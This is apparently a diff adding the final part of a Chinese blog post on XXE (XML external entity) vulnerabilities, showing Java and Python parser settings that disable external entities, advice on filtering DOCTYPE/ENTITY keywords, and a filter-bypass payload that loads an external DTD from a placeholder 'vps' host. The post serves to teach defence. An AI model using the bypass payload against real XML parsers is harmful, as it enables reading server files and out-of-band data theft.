+    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+    dbf.setExpandEntityReferences(false);
+    .setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);  几乎可以防御所有xml实体攻击
+
+    如果不能使用DTDs,可以使用以下两项,两项必须同时存在
+    .setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false) //防止外部普通实体POC攻击
+    .setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false); //防止外部参数实体POC攻击
+
+Python
+    from lxml import etree
+    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+</code></pre><h4 id="过滤用户提交的XML数据"><a href="#过滤用户提交的XML数据" class="headerlink" title="过滤用户提交的XML数据"></a>过滤用户提交的XML数据</h4><p>过滤关键字:<code>&lt;!DOCTYPE 与&lt;EMTITY，或者SYSTEM PUBLIC</code></p>
+<p>可能存在被绕过的情况，如（过滤了&lt;EMTITY）Bypass:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE svg SYSTEM &quot;http://vps/xxe.dtd&quot;&gt;
+&lt;root&gt;
+&lt;user&gt;&amp;xxe;&lt;/user&gt;
+&lt;/root&gt;
+</code></pre><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/122#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/122#toc-4</a><br><a href="https://xz.aliyun.com/t/2249" target="_blank" rel="noopener">https://xz.aliyun.com/t/2249</a><br><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/</a><br><a href="https://xz.aliyun.com/t/2761#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/2761#toc-3</a><br><a href="https://www.freebuf.com/vuls/194112.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/194112.html</a><br><a href="http://www.freebuf.com/vuls/176837.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/176837.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web漏洞/" rel="tag"># Web漏洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/23/天猫项目实战总结/" rel="next" title="仿天猫(SSM版)_项目总结">
+                <i class="fa fa-chevron-left"></i> 仿天猫(SSM版)_项目总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/03/Shiro安全框架入门/" rel="prev" title="Shiro安全框架入门">
+                Shiro安全框架入门 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE"><span class="nav-number">1.</span> <span class="nav-text">XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#概念"><span class="nav-number">1.2.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构建外部实体注入"><span class="nav-number">1.3.</span> <span class="nav-text">构建外部实体注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#有回显读本地敏感文件-Normal-XXE"><span class="nav-number">1.3.1.</span> <span class="nav-text">有回显读本地敏感文件(Normal XXE)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无回显读取本地敏感文件-Blind-OOB-XXE"><span class="nav-number">1.3.2.</span> <span class="nav-text">无回显读取本地敏感文件(Blind OOB XXE)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#外带请求读取文件"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">外带请求读取文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE的危害"><span class="nav-number">1.4.</span> <span class="nav-text">XXE的危害</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#任意文件读取"><span class="nav-number">1.4.1.</span> <span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF-内网主机、端口探测"><span class="nav-number">1.4.2.</span> <span class="nav-text">SSRF/内网主机、端口探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Dos攻击"><span class="nav-number">1.4.3.</span> <span class="nav-text">Dos攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行"><span class="nav-number">1.4.4.</span> <span class="nav-text">命令执行</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#真实案例"><span class="nav-number">1.5.</span> <span class="nav-text">真实案例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#微信XXE"><span class="nav-number">1.5.1.</span> <span class="nav-text">微信XXE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞挖掘中如何快速检测是否存在XXE"><span class="nav-number">1.6.</span> <span class="nav-text">漏洞挖掘中如何快速检测是否存在XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用检测方法"><span class="nav-number">1.6.1.</span> <span class="nav-text">常用检测方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#首先查看XML是否可以成功解析"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">首先查看XML是否可以成功解析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#外部普通实体"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">外部普通实体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#外部参数实体"><span class="nav-number">1.6.1.3.</span> <span class="nav-text">外部参数实体</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码审计XXE"><span class="nav-number">1.6.2.</span> <span class="nav-text">代码审计XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Json-Content-type-XXE"><span class="nav-number">1.6.3.</span> <span class="nav-text">Json Content-type XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用FTP协议获取敏感信息"><span class="nav-number">1.6.4.</span> <span class="nav-text">利用FTP协议获取敏感信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bypass"><span class="nav-number">1.6.5.</span> <span class="nav-text">Bypass</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE如何防御"><span class="nav-number">1.7.</span> <span class="nav-text">XXE如何防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#禁用外部实体"><span class="nav-number">1.7.1.</span> <span class="nav-text">禁用外部实体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤用户提交的XML数据"><span class="nav-number">1.7.2.</span> <span class="nav-text">过滤用户提交的XML数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接"><span class="nav-number">1.7.3.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
